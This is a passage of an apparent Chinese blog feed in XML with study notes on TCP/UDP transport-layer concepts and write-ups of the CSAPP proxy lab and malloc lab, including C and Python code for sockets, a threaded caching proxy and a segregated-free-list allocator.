    <content type="text"><![CDATA[序 这篇系列主要是Computer Networking A Top-Down Approach的一些笔记和心得之类的东西。不过不知到能不能坚持下去。这篇文章主要是运输层相关的一些知识点的笔记。希望能加深自己对网络这块的理解。在经典的五层协议模型中，运输层位于应用层和网络层中间，为应用程序的进程之间的通信起着重要的作用。其中，我们重点研究的对象是运输层协议，包括TCP和UDP。 socket socket是不同端系统间进程通信的基本单位，是操作系统提供的进程间通讯机制。 主要方法有(以python为例)： 创建socket： socket = socket(AF_INET, SOCK_STREAM)，其中，第一个参数指定了IPv4协议，第二个参数指定了TCP协议。同样的，UDP协议的第二个参数为SOCK_DGRAM。函数返回建立的socket的文件描述符 发送或接收数据： socket.recv() (recv方法会阻塞) socket.send() 绑定某个端口： socket.bind()，若使用UDP协议发送数据，无需绑定端口Client： socket.connect() ，与某个socket建立连接，具体建立链接的过程由内核实现(如三次握手) 状态序列如下： Server： socket.listen() ，作用是通知内核，将该socket由主动套接字转化为被动套接字，处于LISTEN状态，此方法不阻塞。同时，内核为每个监听套接字两个队列： 未完成连接队列：收到了SYN，等待第三次握手，此时，socket的状态为SYN_RCVD。 已完成连接队列：三次握手过后，已建立连接，此时，socket状态为ESTABLISHED。 socket.accept()：内核从已完成连接的队列中取出socket，并为之分配相应的内存和文件描述符。如果已完成连接的队列为空，则进程被挂起，直到队列非空。 状态序列如下： Python下使用TCP协议实现简单的客户端和服务端：1234567891011121314151617181920// ClientclientSocket = socket(AF_INET, SOCK_STREAM)clientSocket.connect((serverName, serverPort))sentence = input('Input lowercase sentence:')clientSocket.send(sentence.encode())modifiedMessage = clientSocket.recv(1024)print('From Server: ', modifiedMessage.decode())clientSocket.close()// ServerserverSocket = socket(AF_INET, SOCK_STREAM)serverSocket.bind(('', serverPort))serverSocket.listen(1)print('The server is ready to receive')while True: connectionSocket, addr = serverSocket.accept() sentence = connectionSocket.recv(1024).decode() capitalizedSentenced = sentence.upper() connectionSocket.send(capitalizedSentenced.encode()) connectionSocket.close() UDP协议 UDP协议和TCP相比，有以下特点： UDP是一种无连接协议，端系统间不需要进行连接就可进行通信。因此，UDP时延较小。 UDP首部仅8字节，远远小于TCP。甚至我们可以在应用层基于UDP设计自己的协议。 UDP是一种不可靠的协议，它不能保证数据的按序，准确交付。 以下是UDP报文段的结构： TCP协议 TCP协议具有以下特点： 面向连接。端系统的进程在相互通信前，需要先进行三次握手，此后才能正式开始连接。(注意：TCP是一种抽象意义上的连接，其状态仅仅保存在两个对应的端系统当中，中间的网络元素不负责维持该连接状态) TCP连接提供的是全双工服务，即两个端系统直接可以直接相互发送信息。 TCP是可靠的运输协议，能保证数据的准确交付，但不能保证数据的按序，按时交付。 以下是TCP报文段的结构： 超时时间的估计 TCP通过超时/重传机制来处理报文段丢失问题。超时长度的限定比较复杂，具体公式如下： 我们可以通过每一次某报文段从发出到收到并确认所需的时间来估计，并且，直觉告诉我们，越近的一次RTT对和下一次传输的RTT的关系应该是比较紧密的，因此，我们可以选择维护一个EstimatedRTT值，每当获得一个新的SampleRTT时，则对其进行更新，具体规则如下： EstimatedRTT = (1 - a) * EstimatedRTT + a * SampleRTT 这种平均被称为指数加权移动平均，能比较好的估计出下一次RTT，其中a的推荐值为0.125。但是，我们超时间隔肯定是要比这个要大一些的。并且，为了尽量传输时延，同时，也要尽量减少不必要的重传，我们可以借助偏离值来估算。具体公式如下： DevRTT = (1 - b) * DevRTT + b * |EstimatedRTT - SampleRTT| 其中，b的推荐值为0.25。这样，我们可以大概估算出近几个包我们的估计值的误差大小，当这个误差比较大时，说明网络情况不是很好，有时发生了阻塞，这个时候我们应该稍微增大超时间隔，以适应网络的波动。于是，我们最终得到的超时重传时间计算公式如下： TimeoutInterval = EstimatedRTT + 4 * DevRTT 另外，在发生超时事件后，TCP将不再为超时的包计算RTT，同时，超时间隔加倍，这就提供了某种形式上的拥塞控制，当网络拥塞发生时，TCP会通过阻塞客户端发包的速率来避免加剧拥塞。 由于有时候超时周期比较长，一个报文段丢失后，要等很久才能重传，而后面的包由于窗口大小的限制无法发送，这就导致了时间的浪费。当接收到大于3个以上的冗余ACK的时候，说明接收方在该ACK后的一个包缺失，这时就会触发快速重传。 TCP拥塞控制算法 TCP采用的是拥塞窗口(cwnd)来限制发送方向其连接发送流量的。具体是，在发送方中，未被确认的数据量不会超过cwnd与rwnd中的最小值，即： LastByteSent - LastByteAcked &lt;= min {cwnd, rwnd} 我们知道，TCP仅存在与建立连接的两个端系统上，那么，TCP是如何检测网络拥塞的发生呢？答案是RTT。当发生丢包事件时，即告诉发送方：网络可能发生了拥塞，于是TCP就降低了发送速率。而当收到一个非冗余的ACK时，即告诉了发送方：当前网络通畅，可以继续发送。这是TCP拥塞控制基础。 慢启动 当一条TCP连接开始时，cwnd通常设置为一个较小值(一个MSS)。当第一个发送的包确认到达时，cwnd的值加上一个MSS，于是，第二次发送了两个报文段，同理，当两个报文段都收到时，第三次发送四个报文段，依次类推。当收到一个超时指示的丢包事件时，TCP发送方将cwnd置为1，并重新开始慢启动过程，并且设置慢启动阈值(ssthresh)记为cwnd/2。此后，若当前的cwnd达到或超过了ssthresh，则不再翻倍，而是进入拥塞避免状态。 拥塞避免 为了避免拥塞，在该状态下，每个RTT内(不是每次收到ACK)，cwnd的值只增加一个MSS。TCP发送速率呈较稳定的增长状态。当出现超时指示的丢包事件时，同样的ssthresh被更新为cwnd的一半，同时，cwnd被记为一个MSS。当然，如果出现3个冗余ACK指示的丢包事件时，TCP将cwnd的值减半(为了更好的测量结果，cwnd还应该再加上3个MSS)，更新ssthresh的值，同时进入快速恢复状态。 快速恢复 注意，该状态对TCP来说不是必备的。 在快速回复中，对于造成进入快速恢复状态的ACK，每当收到一个冗余的该ACK时，cwnd增加一个MSS，最终，当丢失报文段的ACK到达时，TCP在降低cwnd后进入拥塞避免状态。同时，如果出现了超时事件，则进入慢启动状态。 如下为一个TCP拥塞窗口演化实例： 小结 从上面的拥塞窗口演化图中，我们可以看到，当进入快速回复状态，很明显传输的效率要高一些，当然，我们也发现，如果网络稳定的话，拥塞窗口将呈现一个锯齿状的状态。当今已经有很多算法可以优化这一点，避免了锯齿状的发生。由于慢启动的原因，如果RTT本身就很大的话，这将很大程度上影响用户的体验。对此，有一个解决方式是，部署一个临近用户的前端服务器，在该服务器上利用TCP分岔来分裂TCP连接。即用户向该服务器发送请求，该服务器进行以一个很大的窗口向数据中心维护一条TCP连接，这样的话，响应时间能从大概4RTT降低到RTT。 Some Detail 1. 端口并不是一个物理层面的概念，而是一个抽象概念。它仅仅是协议栈中的两个字节。 2. TCP和UDP协议可以“监听”同一个端口，两者之间互不干扰。主机在进行多路分解时，是根据{ 协议， 目的端口号， 目的地址， 源端口号， 源地址 }来判断数据是属于哪一个套接字的。 3. 通常情况下，对于某一个特定的协议而言，一个端口号只能对应一个socket，但有例外。比如在创建socket并调用listen方法后，再fork出子进程，此时由于父子进程之间共享了文件描述符，监听的是同一个socket。在linux3.9(不是很确定)以后，当有连接请求时，内核自动选择唤醒某个进程对请求进行处理。在此之前则会唤醒所有进程，并让其中的某一个处理事件。]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csapp-Proxylab]]></title>
    <url>%2F2019%2F02%2F22%2Fcsapp-Proxylab%2F</url>
    <content type="text"><![CDATA[序 这是csapp系列的第八篇文章。具体题目请见官网。本文主要讲csapp中的proxy lab的一些问题以及解决办法。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话，可能要稍微等一会)。 建议在开始实验以前，先把官方的资料看下。不然很可能不知道应该从哪里开始下手。当然，对实验的要求理解清楚之后，做起来还是很简单的(比起上一个实验的话)。 malloc lab 这个实验，要求我们完成一个网络代理，共分为三个部分： A. 完成基础的代理的功能B. 在上一步的基础上实现多线程C. 在上一步的基础上添加缓存功能 具体实现时，可以在实验文件目录下，使用命令 ./driver.sh ，将自动进行测试。其中，第一部分40分，其余各15分，满分为70。但本实验的测试比较水，基本不需要考虑效率的问题，因此难度更降了一层。并且，csapp.c文件中将我们需要的大量的函数都进行了包装，直接调用即可。tiny.c文件也为我们写好了，在完成的时候，可以直接先复制过来。并且，后面B和C部分其实照着书打也就可以拿到满分了。 some notice 1. 在笔者的电脑上(arch linux系统)，使用 ./driver.sh 命令时，发现报错了，显示 command not found 。解决的办法时安装需要的对应软件。在arch下，下载net-tools包即可解决，其他系统应该也是类似的。 2. 在bash中，可以使用命令 ./tiny 46350 &amp; ，在46350端口运行server，并且在后台运行，方便调试。具体可能会用到的还有以下这些命令(具体作用不清楚的话可以查一下)： kill pidfg jidbg jidjobs 3. 当完成某个部分时，可以使用命令 curl –proxy localhost:46351 localhost:46350 在本地对代理进行测试，并且可以在文件中输出一些信息，有利于调试。 4. 和服务器建立连接后，记得把文件描述符回收了，否则不仅占用资源，甚至会导致文件描述符不够用的情况。还有，要十分小心内存泄漏的问题，比如本实验中可能会用到malloc函数，别忘了回收。还有part B部分需要用到多线程，记得使用在子线程中使用pthread_detach(pthread_self())，保证线程资源能自动被系统回收。(也可以使用pthread_join()函数)。 实验正文 如果需要完整代码，请见github，仅供参考。本处仅讲几个比较重要的点。 http协议 想要完成本实验，必须对http协议的基本结构有一定的了解。因此，这里给出一个简单的http请求。 GET / HTTP/1.1Host: localhostContent-Length: 40Connection: close &lt;html>…&lt;/html> 如上。第一行为请求行，格式为”%s %s %s”，三个字符串间均有一个空格。其中，第一个字符串表示的是请求的类型(GET或HEAD或POST等)；第二个字符串表示的是文件的位置，如果以‘/’字符结尾，则自动加上index.html(或home.html)；第三个字符串表示的是版本，一般为“HTTP/1.1”，但这个实验要求我们向server发送信息时必须使用“HTTP/1.0”。 第二行开始是请求头，连续若干行，表示该请求相关的一些信息等。在本实验中，请求头需要有以下内容： Connection: closeProxy-Connection: close 用来表示服务端与用户端仅进行一次数据交换。在HTTP/1.0中，默认情况下是“Keep-Alive”。 请求头后有一个空行，这里要注意一下，该空行用来分离请求头与请求数据，不能省略。 随后的若干行均为请求数据，可以包含任意数据。 对于响应消息，其实和请求很相似。 HTTP/1.0 200 OKServer: Tiny Web ServerConnection: closeContent-length: 115Content-type: text/html Welcome to little_csd.netThanks fot you visited. 如上面为一个简单的相应信息。第一行为状态行，同样包含三个以单个空格隔开的字符串。第一个字符串表示协议，在这里是“HTTP/1.0”，第二个字符串表示的是状态码，第三个字符串表示的是状态消息，和状态码相对应。正常情况下，状态码和状态消息应该分别为”200”和“OK”。 第二行开始为消息报头，为客户端提供一些关于响应消息的信息，比如消息长度(仅含正文)，消息类型等。 消息报头后紧接着又是一个空行，用来分隔。最后是响应正文。 有一点值得注意的是，http协议中，换行是由回车符‘\r’和换行符’\n’组成的，每一行结尾都需要添加这两个字符。 实现代理的基本思路 首先，我们必须明白代理是干什么用的。这样才能准确清楚我们要做什么。如同字面上的意思，代理起到一个类似中间商的作用。当我们利用代理访问某些网络资源的时候，我们客户端首先向代理发送信息，告诉它我们要访问的资源的位置。然后，代理就代替我们访问该资源(比如发送HTTP请求给服务端)，服务端收到访问请求之后，将资源传回给了代理，代理接收后，又发送到我们客户端这边。这样我们就成功地间接访问到了该网络资源。这里以访问www.google.com 为例，用一张简单的图来说明一下。 那么，为什么我们不能直接访问www.google.com 呢？答案显而易见了，www.google.com 被墙屏蔽了，在中国大陆境内访问不了(ipv4协议下)。因此，这就是代理的好处之一。通过访问另一台在墙外的主机，由它帮我们去访问一些被墙的网站，然后再返回给我们，这样我们就成功地间接访问到了我们想要的资源了。 当然，代理还有另一个重要的好处，它可以便于我们实现缓存。我们知道，如果我们每次都直接访问服务器，那么势必会给服务器带来巨大的压力，甚至导致服务器瘫痪。而我们如果代理的时候，它可以自动进行页面的缓存，这样下一次我们再访问同一个资源的时候，代理就不需要向服务器发送请求，直接从本地的缓存中拿出页面文件，然后送回给我们即可，这同时也提高了访问的效率。 好了，接下来我们考虑如何实现了。考虑到同样需要监听某个端口，我们可以直接复制tiny.c中的代码，进行适当的修改即可。(事实上我们只需要更改响应的逻辑)。 和客户端建立连接之后，我们需要读取客户端发送过来的请求，然后进行解析，得到客户端想要访问的主机，然后和对应的主机建立连接，发送HTTP请求(这里要十分注意HTTP请求的格式问题，容易出错)。然后，接收服务端的响应消息，原封不动地传回给客户端即可。1234567GET http://localhost:46350/ HTTP/1.1Host: localhost:46350User-Agent: curl/7.63.0Accept: */*Proxy-Connection: Keep-AliveGET http://localhost:46350/ HTTP/1.1 上面展示的是，使用之前提到的curl命令后，代理收到的请求。我们只需要取请求头的url，获取主机(这里为localhost)，端口号(这里为46350)，文件位置为’/‘，然后我们只需要制作一个HTTP请求发给服务器即可。在我的proxy实现中，HTTP请求如下：123456GET / HTTP/1.0Host: localhost:46350Connection: closeProxy-Connection: closeUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 // 这个空行别漏了 添加多线程 前面说到了实现代理的基本思路，然而实际的服务器如果这样做的话，效率是很低的。我们一次只能处理一个访问请求，这样不合要求。因此，我们可以采用多线程的方法，通过多个线程一起工作来处理消息。当然，最简单的方法是，当接收到一个消息的时候，我们就创建一个线程，然后对消息进行处理。尽管这样就可以拿到该部分的满分了，但我们知道，创建一个线程，对系统来说时间和资源的开销是比较大的，每次接收到消息后就创建线程显然是不明智的，会导致时间上的浪费。因此，在这里我选择了采用预线程化的方法(类似与java中的线程池)，加上书中提到的producer-consumer模式来完成。123456789void *doit(void *vargp)&#123; Pthread_detach(pthread_self()); while (1) &#123; int connfd = sbuf_remove(&amp;sbuf); // 从消息队列中移除某个消息并返回，这里会阻塞 forward(connfd); // 处理某个客户端的消息 Close(connfd); &#125;&#125; 我们选择在一开始就创建线程，然后让线程进入上述函数，这样它就进入了一个无限的循环当中。在sbuf_remove函数中，如果消息队列为空，线程将一直被阻塞，直到拿到消息。sbuf_t相关的一些函数如下，基本的写法其实和书里是一样的。12345678910111213typedef struct &#123; int* buf; // 队列数组 int n; // 队列最大容量 int front，rear; // 用于构造队列 sem_t mutex; sem_t slots; sem_t items;&#125; sbuf_t;void sbuf_init(sbuf_t *sp, int n);void sbuf_deinit(sbuf_t *sp);void sbuf_insert(sbuf_t *sp, int item);int sbuf_remove(sbuf_t *sp); 添加缓存 对于一个比较完善的代理而已，缓存是不可或缺的。要实现缓存，我们需要把代理接收到的服务器的消息保存下来以及请求地址保存下来，然后，每次收到一个消息的时候，我们需要先在缓存中查找，如果在缓存中发现之前有过一个同样的请求，那么只需要直接从缓存中拿出，然后放回给客户端即可。 当然，这里又有另外一个问题，就是我们的缓存策略。正常情况下，比较恰当的缓存方法应该是LRU。当然，这里我偷懒了，采用的是FIFO，即先进先出策略。当缓存的页面数已满或者缓存的总大小超过了我们的设定的上限的时候，我们就将最远的一个缓存对象从缓存中移除。具体的写法见下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869typedef struct &#123; char cache[MAX_OBJECT_SIZE]; // 页面的内容 char dst[MAXLINE]; // 请求地址 int size; // 页面大小&#125; web_obj; // 缓存的对象typedef struct &#123; web_obj* obj; // 缓存对象，这里是一个数组 int size_all; // 所有缓存对象页面内容的总大小 int n; // 缓存对象数的最大值 int objn_cnt; // 当前缓存的对象数 int read_cnt; // 用于 int front, rear; // 用于队列的构造 sem_t mutex; // web_cache访问锁 sem_t write; // 写入的锁，这里采用了读者优先模式&#125; web_cache;void cache_init(web_cache *cache, int n)；void cache_remove(web_cache *cache, int pos);char* cache_find(web_cache *cache, char* dst)&#123; // 这里需要加锁操作 int i, n = cache-&gt;n; int l = (cache-&gt;front+1) % n, len = cache-&gt;objn_cnt; char *ans; for (i = 0; i &lt; len; i++) &#123; web_obj *obj = cache-&gt;obj + l; if (!strcmp(obj-&gt;dst, dst)) &#123; int size = obj-&gt;size; ans = Malloc(size); // 重新开辟一段存储空间 strcpy(ans, obj-&gt;cache); break; &#125; l = (l + 1) % n; &#125; // 这里将锁还回 if (i == len) return NULL; else return ans;&#125;void cache_put(web_cache *wcache, char *dst, char *cache)&#123; P(&amp;wcache-&gt;write); int cnt = wcache-&gt;objn_cnt, n = wcache-&gt;n; if (cnt == n) &#123; int pos = (wcache-&gt;front+1) % n; cache_remove(wcache, pos); &#125; int pos = (++wcache-&gt;rear) % n, size = strlen(cache); web_obj *obj = wcache-&gt;obj + pos; strcpy(obj-&gt;dst, dst); strcpy(obj-&gt;cache, cache); obj-&gt;size = size; wcache-&gt;size_all += size; wcache-&gt;objn_cnt++; while(wcache-&gt;size_all &gt; MAX_CACHE_SIZE) &#123; int pos = (wcache-&gt;front+1) % n; cache_remove(wcache, pos); &#125; V(&amp;wcache-&gt;write);&#125; 整个缓存的模型上面已经展示得很清楚了，但有几个需要十分小心的点。第一个是find的时候，由于有加锁的存在，我们可以保证在当前某线程在搜索的时候，所有缓存对象不会因写入而发生更改，并且，统一时间最多只能有一个线程在遍历缓存对象。但是，当缓存命中的时候，我们需要返回什么？如果直接将缓存对象的指针返回，看似是没有问题的，但该函数如果在还锁之后，线程突然被挂起，然后有另一个线程执行了写操作，恰好将我们返回的那个缓存对象覆盖了。这个时候之前的那个线程重新执行，它返回的指针指向的对象这个时候其实就已经发生变化了。这个一定要理解清楚。 因此，我们选择了将重新开辟一段存储空间，将缓存对象的页面内容放在上面，这个时候，正常情况下，这段空间的内容就不会被其他线程修改了，于是，页面的内容可以正确地返回给了调用它的函数。但是这里又有另一个问题，我们开辟了一段存储空间，同时也需要对其进行回收，因此这就要求了调用cache_find()的函数，在获得了页面对象并使用了之后，需要将该段内容回收。 summary 终于又到了总结的时候了。对这个实验，尽管难度不大，但我们还是可以从其中学会很多东西。比如HTTP请求和响应的一些格式问题，我们能从应用层了解到网络访问是如何实现的。并且，我们也了解到了多线程技术，正确地使用的情况下，可以很大程度上提高程序的效率，并且充分利用了多核CPU的计算能力。当然，这也同时带来了一系列的问题，比如多线程之间的竞争，处理不当会导致程序每次执行的结果都不一样。以及多线程之间共享对象的读写，我们引用了锁的概念，这又带来了一系列新的问题，当一个线程一直持有锁，会导致其他线程被饿死(starvation)，又或者一个线程持有锁的同时又被挂起，导致陷入了死锁(dead lock)，这一系列都是会对我们的程序造成很大影响的错误。由此，线程安全对与一个编程者而言，重要性不言而喻。 最后，还是要来对整个系列做一个小总结的。从去年12月初开始，到今天2月底为止，历时两个多月，终于把这CS:APP3e看完了，并且完成了所有的实验，大部分也都写了认真地写完了相应的博客。怎么说呢，这段时间对我来说收获确实还是很大的，从一个对系统底层几乎毫不了解的小萌新，到现在对CPU，程序等有了一个简单的认识，这一步的跨越还是很大的，很感谢推荐这本书给我的师兄们。 这个系列到今天为止应该也就结束了。很意外的是，基本上自己还是勉勉强强完成了当初给自己立下的flag。接下来的一段时间应该博客就不会有更新了，可能下一个考虑学一下计网吧(如果有可能的话，会做一下上面的实验并写几篇博客)。 皆さん、さよなら]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>proxy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csapp-Malloclab]]></title>
    <url>%2F2019%2F02%2F14%2Fcsapp-Malloclab%2F</url>
    <content type="text"><![CDATA[序 这是csapp系列的第七篇文章。具体题目请见官网。本文主要讲csapp中的malloc lab的一些问题以及解决办法。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话，可能要稍微等一会)。 建议在开始实验以前，先把官方的资料看下。然后，本实验总体难度偏高，至少算是笔者目前花的时间最多的一个实验(算上各种调试，以及写博客花了大概三天吧)，强烈建议把书里显式分配列表的地方看得十分清楚再开始写，不然一开始会无从下手。同样的，本实验需要对数据的存储(chapter 2)，指针等内容有一定的了解，需要经常用到各种类型转换。 倘若你是在官网上下的文件的话，建议找一下完整的trace文件，官网中仅含有两个简单的测试文件，没办法进行较大的数据的测试。 mallco 的简单实现原理内存空间的申请 在不使用malloc的情况下，通常我们需要使用系统调用来获得内存，其中最主要有两个方式。 第一个是sbrk(brk)函数：123#include &lt;unistd.h&gt;int brk(const void *addr);void *sbrk(intptr_t incr); brk的作用是将堆顶指针设置为addr，失败返回0，成功返回1。而sbrk的作用是将堆顶指针增加incr个字节，成功返回新的堆顶地址。 第二种方法使用的是mmap函数，利用匿名映射来实现。123#include &lt;sys/mman.h&gt;void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset);int munmap(void *start, size_t length); 其中，start指针表示想要映射的内存区域的起始地址，length为映射的大小，prot是保护标志，flags是映射的类型(匿名映射使用MAP_ANONYMOUS参数)，offset是偏移量。 munmap则是将映射的空间还给操作系统。 当然，mmap还有另一个重要的作用就是实现快速的I/O，它通过直接将文件映射到虚拟内存，可以直接对其进行读写操作，而不需要使用系统调用read/write，大幅度提高了速度。当然，它只适用于内容的更新，而不适用于内容的添加。同理，使用mmap还可以实现共享内存。 在实际的使用中，我们不可能每次需要内存的时候，都用sbrk或mmap函数(系统调用速度很慢)，这会大幅度降低我们程序的效率。通常我们采用的是一种类似于缓存的思想，使用sbrk函数向内核索取一大片的内存空间，然后，我们再使用一定的手段对这段空间进行管理，当这段空间不够用时，再向内核拿，这样就提高了效率。这也正是malloc函数库所起到的作用。 malloc &amp; free 简单来说，malloc函数主要是通过维护一个空闲列表来实现内存的管理的，具体涉及到的数据结构就是链表。对每一个内存块，我们使用链表将它们串在一起，当需要使用的时候，我们从链表中寻找大小适合的内存块，并且从空闲链表中删除，拿给用户。 当用户用完某个内存块的时候，我们就将其重新插入回空闲链表，这样就实现了简单的内存分配和释放。 但是，这样的实现很明显空间利用率太低了，如果我们当前有个10kb的块，而用户仅需要1kb，这个时候直接分配就过于浪费，因此我们需要对这个块进行切割，拿出1kb给用户，剩下9kb重新放回链表，这样就可以提高一定的利用率。 但我们又发现，如果一个很大的块一直被切割，最后剩下的都是一些零碎的内存块，这个时候我们如果需要一个很大的内存块，这就有问题了，因此，我们需要合并。将几个临近的空闲块合成一个大的块，这样在需要大块内存的时候才有办法。 malloc lab 这个实验，要求我们完成一个动态内存分配器，即模拟libc库中的malloc, free, realloc等函数的功能。本实验我们仅需在mm.c文件中修改，其他的文件我们不需要进行改动（原始的mdriver.c可能会报错，根据提示自行修改即可，或者也可以无视）。最后我们的成绩是用时间效率(每秒操作数)和空间效率(共用了多少空间)衡量。当然，在本实验中，最大的难点在于空间效率的利用上。 实验文件：mm.c 我们需要填写的文件mdriver.c 用于测试我们的程序memlib.c 模拟内存系统，含有mem_sbrk等函数 需要填写的函数：int mm_init(void)void *mm_malloc(size_t size)void mm_free(void *ptr);void *mm_realloc(void *ptr, size_t size); 实验要求及一些注意事项 在本实验中，尽量将所有的结构(链表头等)放在堆内存当中，尽量少定义全局变量。 64位与32位的问题。我们运行的机器应该是64位的，但是在目前csapp官网的makefile文件中有 -m 32 的编译选项，也就是说所有的指针均为32位，即占用4个字节，这点要注意。在某些linux系统中，电脑中可能没有对应的32位的库，因此在编译的时候会显示找不到库，根据自身系统自行下载即可。 本实验要求实现8-bytes对齐，也就是说，mm_malloc返回的指针均为8的倍数。 建议在确定好block的组织方式后，完成mm_check()函数，用于检查堆内存是否出现问题。 建议将trace文件夹放在mdriver所在文件夹中，并且更改config.h文件当中TRACEDIR的宏定义为#define TRACEDIR “traces/“。make之后就可以直接运行./mdriver进行全部测试也可以使用./mdriver -f 命令对某个文件进行测试 对于一些奇怪的段错误，不妨采用打印堆内存的信息，或者模拟指令，或者自己造一个小文件进行测试等。 在正式开始实验以前，请确保理解以下概念(包括各自的特点，优缺点等)： 1. 三种适配方式： - fitst fit - next fit - best fit 2. 三种空闲列表的组织方式 - implicit free list - explicit free list - segregated free list 3. 两种合并的方式 - immediate coalescing - deferred coalescing 4. 两种内存碎片 - internal fragmentation - external fragmentation 5. 空间列表的排序方式 - size order - address order 适配方式 first fit: 最为直接的办法。扫描所有的块，只要当前块的大小满足要求就使用，速度较快。但容易导致空闲列表中前面的块被不断地细分，而后面的一些块却一直迟迟得不到利用。 second fit: 扫描的时候，每次从上一次扫描的下一个块开始，这样可以使得整个列表的块都可以被使用，这使得效率更高。然而，实际应用中，作用也很有限，容易产生很大的空间浪费，造成大量碎片。 best fit：这种方式最大的好处是可以充分地利用空间。找到所有满足要求的块中最小的那一个，这样可以很大程度上避免浪费。当然，这也使得时间成本较高，尤其是如果空间链表的组织方式不太恰当的话，容易导致每次都要遍历一整个列表。 在本实验中，要拿到高分一般采用的是best fit。 列表的组织方式 implicit free list：这种方式最为简单，直接将所有的块(不管是否有分配)串在一起，然后遍历。这种方式可也使得块最小可以达到8 bytes。当然，这种方式效率很低，尤其是当块的数量较多的时候。 explicit free list：在每一个free 块中保存两个指针，将所有空闲的块组成一个双向链表。和隐式相比，这种方式最大的好处在于我们不需要遍历已经分配的块，速度上快了很多，当然，由于需要保存指针，所以每一个块最小为16 bytes。 segregated free list：这种方式的特点在于，根据块的不同大小，分成k组，组织成k条双向链表。分类的方式有很多，比如可以采用2的倍数的分类方式，{1},{2},{3~4},{5~8}……大小为6的块放在第四条链中，大小为3的块则放在第三条链中等等。在本实验中，笔者采用的分类是{1~16},{17~32},{33~64},{65~128},{129~256},{257,512},{513~1024},{1025~2048},{2049~4096},{4096~…}; 两种内存碎片 internal fragmentation：内部碎片，即是已经被分配出去（能明确指出属于哪个进程）却不能被利用的内存空间。比如当前我需要44 bytes的内存，然后malloc的时候分配到了一个48 bytes的块，这样的话，剩下的4 bytes的内存尽管我不需要用到，但是其他程序也无法使用，这就是内部碎片。 external fragmentation：外部碎片，即还没有被分配出去（不属于任何进程），但由于太小了无法分配给申请内存空间的新进程的内存空闲区域。这个比较难理解，这里用一张图来说明一下。 假设上面是内存的一部分。这个时候我如果想要一个大小为3 bytes的内存，我们发现尽管这部分总共有4 bytes的内存没有被我们用到，但是它们被隔开了，我们无法利用。因此，在这种情况下，内存中的这两个没有用到的部分就是外部碎片。需要注意的是，外部碎片和我们请求的大小有关。比如这个时候我要的如果是2 bytes大小的内存，我们发现中间的块是足够的，因此这个时候这个就不算外部碎片了。 about pointer （review） C语言的指针向来是一个难点，在这个实验中，我们需要对指针有一定的理解。本质上而言，指针和其他int，long等类型的数据的存储并没有什么区别，同样是一串数字，指针更多像是C语言为我们提供的地址的抽象，使得我们能够更好地利用地址。 对于一个特定的系统以及编译环境下，指针的大小一般是一样的，通常32位系统下为32位(4 bytes), 64位系统下为64位(8 bytes)。准确上说，指针指向的是所指对象的首个字节。如下图，在一个小端法的机器中，一个大小为0x10f的int型数据存放在地址为0x7b3c~0x7b3f(共4 bytes)的内存区域中。每个字节占用为一个存储单位，对应着一个特定的地址。 这个时候看下以下代码：123int n = 0x10f; // 假设n存放在上述的内存区域中int* p = &amp;n;printf("%p %p", p, p + 1); 输出应该是多少？答案是输出应该为0x7b3c 0x7b40。对于一个指针而言，+1代表着增加一个单位长度，对于int型，大小为4个字节，故一个单位长度大小为4，倘若这个时候n的类型为short，则p+1的值应该为0x7b3e，依此类推。注意，一般情况下，指针之间的加法和乘除法是没有意义的。 继续看以下代码：123int n = 0x10f;char* p = (char *)(&amp;n);printf("%d", *p); 这个时候的输出又是多少呢？答案是0xf。当我们使用取值符号时，得到的数字和指针的类型有关，同样是值为0x7b3c的指针，若类型为int，则应取四个字节，得到0x0000010f, 而如果是char类型的指针，得到的应该是0x0f，同理，若类型为long long，则得到的应该是0x000001120000010f。 因此，通过类型转换，我们可以实现很多意想不到的事情。 mm.c allocated block 和 free block的具体结构如下。其中，successor存的是当前链表中下一个block的地址，predecessor存的是上一个block的地址。通过链表的形式将free block 串联在一起。 注意，这里有一个细节，allocated block中我们将脚部去掉了。与此同时，为了起到和脚部相似的作用，我们在flag位置中，用第二个位来标记上一个block(注意，这里的上一个是指在堆内存中的上一个块，而不是链表中的)是被占用。这样，只有当该标志位为0的时候，我们才认为上一个块是空闲的，可以用来合并。 define 对于这个实验来说，良好的宏定义有助于我们的理解。笔者的宏定义如下(仅列出部分):12345678910111213141516171819202122/* rounds up to the nearest multiple of ALIGNMENT */#define ALIGN(size) (((size) + (ALIGNMENT-1)) &amp; ~0x7)#define PACK(size, alloc) ((size) | (alloc))#define GET(p) (*(unsigned int*)(p))#define PUT(p, val) (*(unsigned int*)(p) = (unsigned int)(val))#define GET_SIZE(p) (GET(p) &amp; ~0x7)#define GET_ALLOC(p) (GET(p) &amp; 0x1)#define GET_PREV_ALLOC(p) (GET(p) &amp; 0x2)#define HDRP(bp) ((char *)(bp) - WSIZE)#define FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)#define NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))#define LAST_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE)))#define NEXT_PTR(bp) ((char*)(bp))#define LAST_PTR(bp) ((char*)(bp) + WSIZE)#define LINK_NEXT(bp) ((char *)GET(bp))#define LINK_LAST(bp) ((char *)GET(bp + WSIZE)) 全局变量 整个实验的全局变量如下： static void* start_pos; // 永远指向当前堆的最顶部static char* end_link_list; // 链表数组后的下一个块static char* start_link_list; // 链表数组的表头 因为本次实验要求最好将数据存放在堆当中，因此我们选择将各个大小的链表头存放在堆一开始的一段连续区间中。具体存放如下(在mm_init函数中执行)12345678910111213141516171819if ((start = (char*) mem_sbrk(14 * WSIZE)) == (char*) -1) return -1;PUT(start, 0); // size &lt;= 16， 因为最小的一个块大小为16，因此这里将size小于16的全部放在同一个链表当中PUT(start + WSIZE, 0); // size &lt;= 32PUT(start + 2 * WSIZE, 0); // size &lt;= 64PUT(start + 3 * WSIZE, 0); // size &lt;= 128PUT(start + 4 * 